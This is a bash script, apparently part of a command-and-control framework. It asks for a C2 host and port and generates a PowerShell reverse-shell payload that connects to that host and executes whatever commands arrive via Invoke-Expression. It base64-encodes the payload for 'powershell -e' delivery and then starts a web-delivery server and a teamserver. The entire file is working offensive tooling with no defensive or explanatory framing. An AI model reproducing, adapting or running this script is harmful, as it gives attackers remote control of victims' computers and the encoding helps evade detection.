#!/bin/bash
read -p "Enter the C2 host: " Host
read -p "Enter the C2 port: " Port
read -p "Please select a port for web delivery >> " PORT
Host=$Host
Port=$Port
PAYLOAD="try {
    \$client = New-Object System.Net.Sockets.TCPClient(\"$Host\", $Port)
    if (-not \$client.Connected) { throw \"Connection failed!\" }
    
    \$stream = \$client.GetStream()
    \$writer = New-Object System.IO.StreamWriter(\$stream)
    \$writer.AutoFlush = \$true
    \$buffer = New-Object System.Byte[] 1024
    \$encoding = New-Object System.Text.ASCIIEncoding

    while (\$client.Connected) {
        \$writer.Write(\"> \")
        \$data = \$encoding.GetString(\$buffer, 0, \$stream.Read(\$buffer, 0, \$buffer.Length)).Trim()
        if (\$data -eq \"exit\") { break }
        \$output = try { Invoke-Expression -Command \$data 2>&1 | Out-String } catch { \$_ }
        \$writer.WriteLine(\$output)
    }

    \$writer.Close()
    \$stream.Close()
    \$client.Close()
}
catch {
    Write-Host \"[!] Error: \$_\"
}"

# Save the original payload
echo "$PAYLOAD" > src/p1/a

# Encode the payload in Base64 (UTF-16LE format required for PowerShell)
ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w 0)

# Save the encoded payload
echo "powershell -e $ENCODED_PAYLOAD" > src/p1/b
read -p "Please slect payload for web delivery(Press 'a' for default powershell payload and 'b' for encoded powershell payload): " payload
payload=src/p1/$payload 
bash -c "./src/teamserver/web_delivery/exec/web_delivery $Host $PORT $payload & exec ./src/teamserver/exec/teamserver_2 $Host $Port"
